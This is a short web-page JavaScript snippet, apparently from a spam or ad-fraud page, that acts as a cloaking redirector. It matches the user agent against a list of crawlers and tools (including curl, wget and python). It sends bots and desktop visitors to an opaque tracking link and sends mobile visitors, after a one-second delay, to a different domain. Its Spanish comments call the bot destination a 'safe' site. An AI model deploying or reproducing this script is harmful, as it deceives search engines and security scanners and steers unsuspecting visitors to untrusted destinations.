script>
  function isBot() {
    const ua = navigator.userAgent.toLowerCase();
    const botKeywords = [
      "bot", "crawl", "spider", "slurp", "mediapartners", "google", 
      "bing", "facebook", "yahoo", "curl", "python", "http", "wget", "java"
    ];
    return botKeywords.some(keyword => ua.includes(keyword));
  }

  function isMobile() {
    return /android|iphone|ipad|ipod|opera mini|mobile/i.test(navigator.userAgent);
  }

  window.onload = function() {
    if (isBot()) {
      // Si es bot o crawler → redirige a un sitio seguro
      window.location.href = "https://formationcrucialwildest.com/ncm6bswk9?key=c557fff9fe194e94c8546b8e66aa5c4c";
      return;
    }

    if (isMobile()) {
      // Si es móvil → redirige en 1 segundo al enlace principal
      setTimeout(function() {
        window.location.href = "https://rondo.my.id";
      }, 1000);
    } else {
      // Si es PC → redirige a otro enlace
      window.location.href = "https://formationcrucialwildest.com/ncm6bswk9?key=c557fff9fe194e94c8546b8e66aa5c4c";
    }
  };
</script>
